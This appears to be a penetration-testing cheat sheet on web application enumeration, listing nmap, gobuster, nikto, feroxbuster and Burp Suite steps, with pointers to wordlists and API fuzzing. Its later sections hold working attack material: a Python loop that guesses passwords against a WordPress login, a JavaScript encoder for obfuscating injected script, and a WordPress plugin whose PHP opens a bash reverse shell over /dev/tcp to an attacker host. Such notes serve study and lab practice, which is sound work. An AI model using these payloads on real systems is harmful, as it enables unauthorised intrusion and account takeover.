# WebApps enum

OWASP top ten: https://owasp.org/www-project-top-ten/

## Nmap

```
sudo nmap -p80 -sV $IP
sudo nmap -p80 --script=http-enum $IP
```

## Wappalyzer

Technology stack: https://www.wappalyzer.com/

## Sitemaps

```
http://ip/robots.txt
http://ip/sitemap.xml
```

## Dirb

```
dirb http://$IP
```

## Gobuster 

### Directory brute force

Documentation on Kali: https://www.kali.org/tools/gobuster/
S1ren: https://sirensecurity.io/blog/common/
```
gobuster dir -u $IP -w /path/to/wordlist.txt
```
Kali wordlists: `/usr/share/wordlists/dirb/*.txt`
Daniel Miessler wordlists: https://github.com/danielmiessler/SecLists

Directory enumeration:
```
vi /etc/hosts
    a.b.c.d some.url.com
URL=http://some.url.com
gobuster dir -u $URL -w ~/github/SecLists/Discovery/Web-Content/raft-large-directories.txt
```
and find subdirectories. Other options: `-b some_http_code` to ignore error codes

With subdirectories, files enumeration: `URL=a.b.c.d:p`
```
gobuster dir -u http://$URL/some_nice_dir/ -w /usr/share/wordlists/dirb/common.txt -o myresultfile.txt -x txt,pdf,config
```

### Enumerating APIs

Make a pattern file `pattern.txt`:
```
{GOBUSTER}/v1
{GOBUSTER}/v1
```
then fuzz the placeholder with a wordlist:
```
gobuster dir -u http://ip:port -w /usr/share/wordlists/dirb/big.txt -p pattern.txt
```
Curl with headers: `curl -i`

Post json data:
```
curl -d '{"username":"someuser","password":"somepass"}' -H 'Content-Type: application/json' http://$IP/path/to/login/page.html
```

## Nikto

Many false positives:
```
nikto -host $IP -port $Port
```

## Feroxbuster

```
feroxbuster --url http://$IpTarget
```

## Burp Suite

Proxy > Proxy Settings > Proxy Listeners\
Firefox > Connection Settings > Configure Proxy > Manual > 127.0.0.1\
Proxy > HTTP history > right-click "Send to repeater"\
Repeater > Send\
`cat /etc/hosts # add the website`\
Proxy > HTTP history > right-click "Send to intruder"\
Intruder > Clear/Add > Payload > Paste > paste a wordlist > check the return code

## Python manual password attack

Using the `requests` module: https://requests.readthedocs.io/en/latest/api
```
import requests
for i in ['test', 'pass', 'password']:
    r = requests.post('http://offsecwp/wp-login.php', data={'login_field': 'user_to_hack', 'password_field': i})
    print(r.status_code, len(r.content))
```

## Javascript

Shortcuts:
- console: `^C+^S+k`
- devtools: `^C+^S+i`

```
function myFunc(a,b){
  return a+b
  }
let c = myFunc(n1,n2)

function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```

Minified Javascript: https://jscompress.com/

## WordPress reverse shell plugin

https://www.sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell

Php file:
```
<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/$AttackerIp/$AttackerPort 0>&1'");
?>
```
then zip it: `zip revsh-wp-plugin.zip revsh-wp-plugin.php` \
and upload it on WordPress.
